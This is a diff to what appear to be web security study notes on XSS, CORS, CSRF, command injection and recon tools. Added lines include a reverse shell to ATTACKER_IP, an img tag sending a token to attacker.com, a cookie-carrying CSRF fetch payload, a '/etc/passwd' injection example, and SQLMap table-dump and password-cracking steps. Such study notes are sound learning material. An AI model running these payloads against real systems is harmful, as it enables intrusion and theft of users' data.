@@ -239,11 +239,11 @@
     - `Content-Security-Policy: default-src 'self'; script-src scripts.example.com`
     - Embedded JS not executed → must load from external files → attacker can't inject inline scripts
 
-  // TODO: elaborate on this with session vs cookie vs authorization, credtionals etc
   #subinline("Token Storage & XSS")
   - *HttpOnly cookies*: JS cannot read (`document.cookie` blocked), but XSS can still *send* requests (browser auto-attaches)
   - *localStorage/sessionStorage*: Always accessible to JS → XSS = instant token theft
   - *Where to store*: SSR → HttpOnly cookies (session-based). REST API → sessionStorage (private per tab, no CSRF). Avoid localStorage (persists, shared).
+  - *Authorization header*: `Authorization: Bearer <token>` sent manually by JS → not auto-attached like cookies → immune to CSRF
 
   #subinline("DOM-based XSS")
   - Server NOT involved → client JS reads untrusted data (URL, DOM) and processes insecurely
@@ -887,11 +887,12 @@
   if (filename.contains("/") || filename.contains("..")) reject();
   ```
 
-  #subinline("Command Injection")
+  #subinline("Command Injection / RCE")
   User input passed to shell without sanitization → *RCE* (Remote Code Execution).
   - Metacharacters: `;` (chain), `&&` (on success), `||` (on failure), `|` (pipe)
   - Example: `ping $input` → attacker sends `127.0.0.1; cat /etc/passwd`
-  - *Fix*: Use `ProcessBuilder` with array args (no shell), or whitelist allowed values
+  - *Template engines / PDF generators*: User input evaluated as code → RCE (look for `${...}` syntax)
+  - *Fix*: Use `ProcessBuilder` with array args (no shell), whitelist values, sandbox PDF generation
 
   #subinline("Encoding Attacks")
   Input validation alone may not prevent attacks if app decodes data later.
@@ -1060,8 +1061,16 @@
   config.setAllowedOrigins(Arrays.asList("https://localhost:8081")); // NOT "*"!
   config.setAllowedMethods(Arrays.asList("OPTIONS", "GET", "POST", "DELETE"));
   config.setAllowedHeaders(Arrays.asList("*"));
+  config.setAllowCredentials(true); // Only if cookies needed!
   ```
-  // TODO: explain this fucking headers also with credentials allow and also the content type shit
+
+  #subinline("Access-Control-Allow-Credentials")
+  *Only needed when JS uses* `credentials: 'include'` (to send cookies cross-origin):
+  - Without it: JS can read *public* data (no cookies sent, unauthenticated)
+  - With it: JS can read *private* data (cookies sent, authenticated as victim!)
+  - Cannot use with `Access-Control-Allow-Origin: *` (browser blocks this combo)
+  - *Attack*: If server reflects any origin + allows credentials → attacker reads victim's authenticated data
+
   #subinline("CORS Origin Reflection Attack")
   Server blindly reflects any `Origin` header → complete data theft:
   ```java
@@ -1081,14 +1090,9 @@
   #subinline("CSRF Content-Type Bypass")
   `Content-Type: text/plain` = "simple request" → *no CORS preflight*!
   - Server may still parse body as JSON despite wrong Content-Type
-  - Attacker sends `text/plain` with JSON body + victim's cookies → CSRF works
+  - Attack: `fetch(url, {method:'POST', mode:'no-cors', credentials:'include', headers:{'Content-Type':'text/plain'}, body:JSON.stringify(data)})`
+  - `mode:'no-cors'` = don't read response (avoids CORS block), `credentials:'include'` = send victim's cookies
   - *Fix*: Validate Content-Type header server-side, use SameSite cookies
-
-  #subinline("Token Storage")
-  - *Session storage* (preferred): private per tab, deleted on browser close
-  - *Local storage*: shared across tabs, persists (XSS in one tab compromises all)
-  - *Cookies*: BAD! Even `HttpOnly` cookies sent with `credentials:"include"` → CSRF possible
-    - `HttpOnly` only prevents *stealing* (`document.cookie`), not *sending*!
 
   #subinline("XSS in SPAs")
   - *Server XSS*: Not an issue (no HTML generated server-side in pure SPAs)
@@ -1103,6 +1107,7 @@
   - Browser executes `<script>` in JSON response as HTML
   - Attacker stores JS in comment field → victim views → token stolen via `<img src="attacker.com?t=TOKEN">`
   - `<img>` bypasses CORS (only applies to fetch/XHR, not HTML tags)
+  - *Tip*: JSON escapes double quotes → use single quotes in XSS payloads
   - *Fix*: Return correct `Content-Type: application/json`, sanitize input
 
   #inline("Security Checklist")
@@ -1366,16 +1371,28 @@
   *Signatures*: `SHA256withRSA`, `SHA512withRSA`, `SHA3-256withRSA`
 
   #inline("Recon & Exploitation Tools")
-  - *Directory discovery*: `gobuster dir -u https://target -w /usr/share/wordlists/dirb/common.txt`
-    - Add `-d` flag to detect backup files (`file~`, `.file.swp`)
-  - *SQLMap*: `sqlmap -r request.txt --force-ssl --dbs` (auto SQLi, `--technique=B` for blind only)
-  - *John the Ripper*: `john --format=raw-sha256 --wordlist=wordlist.txt hashes.txt` (format: `user:hash`)
-  - *JWT decode*: `echo 'eyJhbG...' | cut -d'.' -f2 | base64 -d` or use jwt.io
-  - *Burp Suite*: Intercept/modify requests, Intruder for fuzzing, Sequencer for session analysis
-  - *ZAP*: Alternative to Burp, Fuzzer not rate-limited
-  - *Request Catcher*: Receive exfiltrated data (requestcatcher.com) - use `/debug` endpoint to view requests
-  - *curl with auth*: `curl -u "user:pass" https://target` | with proxy: `curl -x http://127.0.0.1:8080`
-  - *Check IP via Tor*: `proxychains -q curl -s ifconfig.io`
+
+  #subinline("SQLMap (auto SQLi)")
+  Found a suspicious parameter? Save request from Burp → Run SQLMap:
+  1. In Burp: Right-click request → "Copy to file" → `request.txt`
+  2. `sqlmap -r request.txt --force-ssl --dbs` → lists databases if vulnerable
+  3. `sqlmap -r request.txt --force-ssl -D dbname --tables` → list tables
+  4. `sqlmap -r request.txt --force-ssl -D dbname -T users --dump` → dump table
+
+  #subinline("John the Ripper (password cracking)")
+  Found password hashes in database? Crack them:
+  1. Create `hashes.txt` with format `username:hash` (one per line)
+  2. `john --wordlist=rockyou.txt hashes.txt` → cracks with wordlist
+  3. `john --show hashes.txt` → show cracked passwords
+  - *SHA256*: `--format=raw-sha256`
+  - *Salted SHA256* `sha256(salt+pass)`: `--format=dynamic_61` (format: `user:hash$salt`)
+  - *JWT*: `john jwt.txt` (auto-detects HMAC-SHA256)
+
+  #subinline("Other Tools")
+  - *gobuster*: Find hidden dirs/files → `gobuster dir -u https://target -w /usr/share/wordlists/dirb/common.txt`
+  - *cewl*: Generate wordlist from website → `cewl -w words.txt https://target/about`
+  - *Reverse shell*: Attacker `nc -lvnp 1337` → Victim `nc ATTACKER_IP 1337 -e /bin/sh`
+  - *SQLite*: Open DB → `sqlite3 db.db` → `.tables` → `.schema` → `SELECT * FROM users;`
 
   #inline("Information Disclosure Patterns")
   #subinline("Backup Files")
